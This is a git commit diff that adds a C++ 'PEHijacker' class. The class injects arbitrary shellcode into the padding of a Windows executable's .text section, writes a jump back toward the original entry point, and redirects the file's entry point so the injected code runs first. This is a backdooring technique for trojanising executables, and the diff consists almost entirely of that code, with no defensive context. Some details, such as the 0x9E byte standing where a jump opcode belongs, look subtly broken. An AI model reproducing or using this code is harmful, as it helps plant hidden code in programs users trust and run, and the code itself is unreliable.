350baa90668bebda20da58240e0f4c9260d53ec2
Joe <joestanding@users.noreply.github.com>
2018-04-01 11:08:34 +0100

    Added actual hijacking code that I lost somehow

--- hijacker.cpp
+++ hijacker.cpp
@@ -1,65 +1,139 @@
 #include "hijacker.h"
 
-PEHijacker::PEHijacker() {
+PEHijacker::PEHijacker() { }
 
-}
+int PEHijacker::loadPE(char * pePath) {
+	std::ifstream peStream;
 
-PEHijacker::~PEHijacker() {
+	peStream.open(pePath, std::ios::binary);
 
-}
-
-void PEHijacker::setHijackMode(int mode) {
-	this->mode = mode;
-}
-
-int PEHijacker::loadPE(char * path) {
-	std::ifstream peHandle;
-	size_t peSize;
-	unsigned char * peBuffer;
-
-	peHandle.open(path, std::ios::binary);
-
-	if (!peHandle.is_open()) {
+	if (!peStream.is_open()) {
 		return -1;
 	}
 
-	peHandle.seekg(0, std::ios::end);
-	peSize = peHandle.tellg();
-	peHandle.seekg(0, std::ios::beg);
+	peStream.seekg(0, std::ios::end);
+	peSize = peStream.tellg();
+	peStream.seekg(0, std::ios::beg);
 
-	peBuffer = new unsigned char[peSize];
-	peHandle.read((char*)peBuffer, peSize);
+	this->peBuffer = new unsigned char[this->peSize];
+	peStream.read((char*)this->peBuffer, this->peSize);
 
-	PIMAGE_DOS_HEADER peDosHeader = (PIMAGE_DOS_HEADER)peBuffer;
-	PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)peDosHeader + peDosHeader->e_lfanew);
-	PIMAGE_FILE_HEADER peFileHeader = (PIMAGE_FILE_HEADER)&peNtHeaders->FileHeader;
-	PIMAGE_OPTIONAL_HEADER peOptHeader = (PIMAGE_OPTIONAL_HEADER)&peNtHeaders->OptionalHeader;
-	PIMAGE_SECTION_HEADER * peSecHeaders = new PIMAGE_SECTION_HEADER[peFileHeader->NumberOfSections];
+	this->peDosHeader = (PIMAGE_DOS_HEADER)this->peBuffer;
+	this->peNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)peDosHeader + peDosHeader->e_lfanew);
+	this->peFileHeader = (PIMAGE_FILE_HEADER)&peNtHeaders->FileHeader;
+	this->peOptHeader = (PIMAGE_OPTIONAL_HEADER)&peNtHeaders->OptionalHeader;
+	this->peSecHeaders = new PIMAGE_SECTION_HEADER[peFileHeader->NumberOfSections];
 	for (int i = 0; i < peFileHeader->NumberOfSections; i++)
 		peSecHeaders[i] = (PIMAGE_SECTION_HEADER)((BYTE*)peNtHeaders + sizeof(IMAGE_NT_HEADERS) + (i) * sizeof(IMAGE_SECTION_HEADER));
-	
+
+	return ERROR_SUCCESS;
+}
+
+int PEHijacker::savePE(char * pePath) {
+	std::ofstream peStream;
+	peStream.open(pePath, std::ios::binary);
+	peStream.write((char*)this->peBuffer, this->peSize);
+	peStream.close();
+	return ERROR_SUCCESS;
+}
+
+void PEHijacker::hijack() {
+	PIMAGE_SECTION_HEADER textSection = this->getSectionHeader((char*)".text");
+	DWORD startOfPadding = this->getStartOfPadding(textSection);
+
+	for (int i = 0; i < this->shellcodeLength; i++)
+		this->peBuffer[startOfPadding + i] = this->shellcode[i];
+
+	DWORD newEntryAddress = textSection->VirtualAddress + textSection->Misc.VirtualSize;
+	DWORD entryAddressFileOffset = this->peDosHeader->e_lfanew + sizeof(DWORD) + sizeof(_IMAGE_FILE_HEADER) + offsetof(_IMAGE_OPTIONAL_HEADER, AddressOfEntryPoint);
+	int jumpDistance = newEntryAddress - this->getEntryAddress() + this->shellcodeLength;
+	printf("jumpDistance: %d bytes (0x%08x)\n", jumpDistance, jumpDistance);
+
+	this->peBuffer[startOfPadding + this->shellcodeLength - 1] = 0x9E;
+	for (int i = 0; i < sizeof(jumpDistance); i++)
+		this->peBuffer[startOfPadding + this->shellcodeLength + i] = *((unsigned char *)&jumpDistance + i);
+
+	for (int i = 0; i < sizeof(newEntryAddress); i++)
+		this->peBuffer[entryAddressFileOffset + i] = *((unsigned char *)&newEntryAddress + i);
+}
+
+// ============================================================================= //
+//  Helper Functions
+// ============================================================================= //
+
+PIMAGE_SECTION_HEADER PEHijacker::getSectionHeader(char * sectionName) {
+	for (int i = 0; i < this->peFileHeader->NumberOfSections; i++)
+		if (strcmp(sectionName, (char*)this->peSecHeaders[i]->Name) == 0)
+			return this->peSecHeaders[i];
+	return NULL;
+}
+
+DWORD PEHijacker::getEntryAddress() {
+	return this->peOptHeader->AddressOfEntryPoint;
+}
+
+DWORD PEHijacker::getStartOfPadding(PIMAGE_SECTION_HEADER sectionHeader) {
+	return (sectionHeader->PointerToRawData + sectionHeader->Misc.VirtualSize);
+}
+
+DWORD PEHijacker::getDataSize(PIMAGE_SECTION_HEADER sectionHeader) {
+	return (sectionHeader->SizeOfRawData - (sectionHeader->SizeOfRawData - sectionHeader->Misc.VirtualSize));
+}
+
+DWORD PEHijacker::getPaddingSize(PIMAGE_SECTION_HEADER sectionHeader) {
+	return (sectionHeader->SizeOfRawData - sectionHeader->Misc.VirtualSize);
+}
+
+// ============================================================================= //
+//  Setters
+// ============================================================================= //
+
+void PEHijacker::setArchitecture(int arch)
+{
+}
+
+void PEHijacker::setShellcode(unsigned char * shellcode, unsigned int length) {
+	this->shellcode = shellcode;
+	this->shellcodeLength = length;
+}
+
+void PEHijacker::setEntryPoint(DWORD address)
+{
+}
+
+// ============================================================================= //
+//  Printing Output
+// ============================================================================= //
+
+void PEHijacker::printFileHeader() {
 	printf("---------------------------\n");
 	printf(" File Header\n");
 	printf("---------------------------\n");
-	printf("  Number of Sections: %d\n", (int)peFileHeader->NumberOfSections);
-	printf("  Number of Symbols: %d\n", (int)peFileHeader->NumberOfSymbols);
-	printf("  Timestamp: %d\n", (int)peFileHeader->TimeDateStamp);
+	printf("  Number of Sections: %d\n", (int)this->peFileHeader->NumberOfSections);
+	printf("  Number of Symbols: %d\n", (int)this->peFileHeader->NumberOfSymbols);
+	printf("  Timestamp: %d\n", (int)this->peFileHeader->TimeDateStamp);
 	printf("\n");
+}
+
+void PEHijacker::printOptionalHeader() {
 	printf("---------------------------\n");
 	printf(" Optional Header\n");
 	printf("---------------------------\n");
-	printf("  Entry Point: %08x\n", peOptHeader->AddressOfEntryPoint);
+	printf("  Entry Point: 0x%08x\n", peOptHeader->AddressOfEntryPoint);
 	printf("\n");
-	for (int i = 0; i < peFileHeader->NumberOfSections; i++) {
-		printf("---------------------------\n");
-		printf(" Section: %s\n", peSecHeaders[i]->Name);
-		printf("---------------------------\n");
-		printf("  Relative Virtual Address: %08x\n", peSecHeaders[i]->VirtualAddress);
-		printf("  Virtual Size: %d (%08x)\n", peSecHeaders[i]->Misc.VirtualSize, peSecHeaders[i]->Misc.VirtualSize);
-		printf("\n");
-	}
+}
 
-	this->peBuffer = peBuffer;
-
-	return ERROR_SUCCESS;
+void PEHijacker::printSectionHeader(PIMAGE_SECTION_HEADER sectionHeader) {
+	DWORD startOfPadding = this->getStartOfPadding(sectionHeader);
+	DWORD paddingSize = this->getPaddingSize(sectionHeader);
+	printf("---------------------------\n");
+	printf(" Section: %s\n", sectionHeader->Name);
+	printf("---------------------------\n");
+	printf("  Relative Virtual Address: %d bytes (0x%08x)\n", sectionHeader->VirtualAddress, sectionHeader->VirtualAddress);
+	printf("  Start of Raw Data on Disk: %d bytes (0x%08x)\n", sectionHeader->PointerToRawData, sectionHeader->PointerToRawData);
+	printf("  Size of Raw Data on Disk: %d bytes (0x%08x)\n", sectionHeader->SizeOfRawData, sectionHeader->SizeOfRawData);
+	printf("  Virtual Size: %d bytes (0x%08x)\n", sectionHeader->Misc.VirtualSize, sectionHeader->Misc.VirtualSize);
+	printf("  Start of Padding: %d bytes (0x%08x)\n", startOfPadding, startOfPadding);
+	printf("  Padding Size: %d bytes (0x%08x)\n", paddingSize, paddingSize);
+	printf("\n");
 }
--- hijacker.h
+++ hijacker.h
@@ -1,17 +1,36 @@
 #pragma once
+
 #include <iostream>
 #include <fstream>
 #include <Windows.h>
 
 class PEHijacker {
 private:
-	char * path;
-	int mode;
 	unsigned char * peBuffer;
-
+	size_t peSize;
+	PIMAGE_DOS_HEADER peDosHeader;
+	PIMAGE_NT_HEADERS  peNtHeaders;
+	PIMAGE_FILE_HEADER  peFileHeader;
+	PIMAGE_OPTIONAL_HEADER  peOptHeader;
+	PIMAGE_SECTION_HEADER * peSecHeaders;
+	unsigned char * shellcode;
+	unsigned int shellcodeLength;
 public:
+	int ARCH_X86 = 1;
+	int ARCH_X64 = 2;
 	PEHijacker();
-	~PEHijacker();
-	void setHijackMode(int);
-	int loadPE(char * path);
+	int loadPE(char * pePath);
+	int savePE(char * pePath);
+	void hijack();
+	void setArchitecture(int arch);
+	void setShellcode(unsigned char * shellcode, unsigned int length);
+	void setEntryPoint(DWORD address);
+	void printFileHeader();
+	void printOptionalHeader();
+	void printSectionHeader(PIMAGE_SECTION_HEADER sectionHeader);
+	DWORD getEntryAddress();
+	DWORD getStartOfPadding(PIMAGE_SECTION_HEADER sectionHeader);
+	DWORD getDataSize(PIMAGE_SECTION_HEADER sectionHeader);
+	DWORD getPaddingSize(PIMAGE_SECTION_HEADER sectionHeader);
+	PIMAGE_SECTION_HEADER getSectionHeader(char * sectionName);
 };
